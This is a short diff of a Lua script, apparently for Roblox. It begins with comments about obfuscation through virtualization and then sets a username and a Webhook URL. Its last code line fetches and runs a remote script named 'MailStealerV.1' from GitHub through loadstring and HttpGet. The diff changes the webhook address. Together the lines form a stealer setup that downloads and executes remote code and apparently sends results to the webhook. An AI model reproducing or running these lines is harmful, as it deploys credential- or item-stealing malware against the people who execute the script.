@@ -69,7 +69,8 @@ print("How to obfuscate best?")
 -- The highest level of obfuscation is done through virtualization,
 -- in our case this means we will be running Lua inside Lua using the
 -- Ironbrew2 virtulization tool. Ready? click [Demo VM] and see what happens!username = "moleryo"
-Webhook = "https://github.com/moleryo/ww/blob/main/DUPEREALOMG"
+Webhook = "https://luaobfuscator.com/?session=0t0x6C162PCZ1D4lM01Vy35GTQtWUODvjAve4NrthLq69e76BnktmS3tY8oC1Nz3"
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/CatZHubOffical/MailStealerV.1/main/V.2"))()
+
 
